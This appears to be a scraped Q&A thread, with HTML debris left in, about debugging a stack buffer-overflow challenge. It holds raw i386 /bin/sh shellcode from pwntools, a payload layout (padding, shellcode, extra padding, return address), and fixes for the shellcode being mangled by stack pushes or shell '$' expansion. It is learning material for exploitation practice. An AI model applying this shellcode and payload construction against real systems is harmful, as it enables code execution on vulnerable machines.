I get a seg fault, and can use gdb to see eip has been overwritten with 0xdeadbeef - great so now I assumed the stack size is 132 bytes and then the next 4 overwrite eip to redirect the return.\n </p>\n <p>\n  ( a lot of guides say to use 144 here - but I'm assuming the challenge changed? )\n </p>\n <p>\n  I used pwntools to generate me shellcode for a shell ( the same way I solves the previous challenge ) - and got\n </p>\n <p>\n  <code>\n   -> asm(shellcraft.i386.linux.sh())\n'jhh///sh/bin\\x89\\xe3h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xc9Qj\\x04Y\\x01\\xe1Q\\x89\\xe11\\xd2j\\x0bX\\xcd\\x80'\n  </code>\n </p>\n <p>\n  This payload worked on the previous challenge, but now when I go through the process of sticking this shellcode in my payload it never works. Replacing this with a shellcode from a guide works fine\n  <code>\n   asm(shellcraft.i386.linux.sh())\n'h\\x01\\x01\\x01\\x01\\x814$ri\\x01\\x011\\xd2Rj\\x04Z\\x01\\xe2R\\x89\\xe2jhh///sh/binj\\x0bX\\x89\\xe3\\x89\\xd1\\x99\\xcd\\x80'\n  </code>\n </p>\n <p>\n  It looks the same but with some extra stuff at the start. Why is this and how is it produced?\n </p>\n</div>\n</body></html>",

The reason is that the\n  <code>\n   push\n  </code>\n  instructions modify the stack,\n  <em>\n   where your shellcode is\n  </em>\n  . This means that the shellcode is (unintentionally) mutated to something else, and of course shenanigans ensue.\n </p>\n <p>\n  The solution is to\n  <a href=\"https://security.stackexchange.com/questions/133629/why-append-an-nop-sled-at-the-end-of-the-shellcode\">\n   add some padding\n   <em>\n    after\n   </em>\n   the shellcode\n  </a>\n  . Because the stack grows to lesser addresses,\n  <code>\n   push\n  </code>\n  instructions will first overwrite the data in the greater address locations.\n </p>\n <pre><code>PADDING + SHELLCODE + **MORE_PADDING** + RETURN_ADDRESS\n</code></pre>\n <p>\n  For me,\n  <code>\n   MORE_PADDING\n  </code>\n  of 32 bytes worked nicely. Do not forget to reduce the size of the original\n  <code>\n   PADDING\n  </code>\n  appropriately so that the return address is correctly overwritten.\n </p>\n</div>\n</body></html>",

After breaking on the payload you can notice GDB is showing these instructions (as Intel flavor disassembly):\n </p>\n <pre><code>push   0x68\npush   0x732f2f2f\npush   0x6e69622f\nmov    ebx,esp\npush   0x1010101\nxor    DWORD PTR [ecx+eax*1],0x51c93101\npush   0x4\n</code></pre>\n <p>\n  This XOR instruction is suspicious since it is using\n  <em>\n   eax\n  </em>\n  and\n  <em>\n   ecx\n  </em>\n  while they've not been initiliazed by our shellcode. I checked against what\n  <em>\n   pwnlib\n  </em>\n  instructions suggest for this shellcode:\n </p>\n <pre><code>shellcraft.i386.linux.sh()\n/* ... */\nxor dword ptr [esp], 0x1016972\n/* ... */\n</code></pre>\n <p>\n  Then, you're still getting a SEGFAULT because the instruction is wrong, and dereferencing some incorrect values.\n </p>\n <p>\n  Also the second shellcode you're providing can be retrieved with\n  <code>\n   shellcraft.execve('/bin/sh')\n  </code>\n  .\n </p>\n <hr/>\n <p>\n  EDIT\n </p>\n <p>\n  The issue is not from\n  <em>\n   pwntools\n  </em>\n  but must be linked to the way the payload is used. The bad instruction identified above contains a '$' character which is then (if you still use your\n  <code>\n   $(python -c '...')\n  </code>\n  input) interpreted by the subshell invoked as the variable name '$ri'.\n </p>\n <p>\n  This variable is likely not defined in your shell which in turn makes these 3 characters to be deleted from the input given to the program, hence, modifying operands of this instruction and the instruction following it.\n </p>\n <p>\n  In order to make it right, you may sanitize the input by bringing whatever is required. For example :\n </p>\n <pre><code>asm(shellcraft.i386.linux.sh()).replace('$','\\$')\n</code></pre>\n <p>\n  I suppose it is the issue you got, but can't be sure without more information.\n </p>\n</div>\n</body></html>",
